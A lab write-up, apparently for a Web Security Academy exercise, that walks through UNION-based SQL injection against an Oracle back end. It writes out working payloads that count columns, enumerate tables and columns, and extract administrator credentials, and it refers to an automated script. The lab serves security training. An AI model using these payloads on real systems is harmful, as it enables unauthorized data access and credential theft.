# SQL Injection Lab 06 - SQL injection attack, listing the database contents on Oracle

## Manual Solution

1. Access the lab in Web Security Academy
2. Determine the number of columns for UNION attack
   - Test: `/filter?category=Gifts' ORDER BY 1--`
   - Result: No error (at least 1 column exists)
   - Test: `/filter?category=Gifts' ORDER BY 2--`
   - Result: No error (at least 2 columns exist)
   - Test: `/filter?category=Gifts' ORDER BY 3--`
   - Result: Error (confirms 2 columns)

3. Verify column data types:
   - Test: `/filter?category=Gifts' UNION SELECT '1', '2' FROM dual--`
   - Result: Values '1' and '2' displayed (confirms string compatibility)

4. List the database contents:
   - Test: `/filter?category=Gifts' UNION SELECT NULL,table_name FROM all_tables --`
   - Result: List of tables in the database. There are many tables, we don't know which one has the username and password.

5. List the table like USERS% :
   - Test: `/filter?category=Gifts' UNION SELECT table_name,column_name FROM all_tab_columns WHERE table_name LIKE 'USERS_%' --`
   - Result: You'll see a table starts with users_... and its columns. Example: USERS_HZPHRO and its columns are PASSWORD_MZORWL and USERNAME_GZKLJS.

6. Extract the username and password:
   - Test: `/filter?category=Gifts' UNION SELECT [YOUR_COLUMN_NAME],[YOUR_COLUMN_NAME] FROM [YOUR_TABLE_NAME]--`
   - Result: administrator and password

7. Login to the administrator account

## Automated Solution

1. Download the script
2. Run the script with the following command: python sqli_lab_06.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)

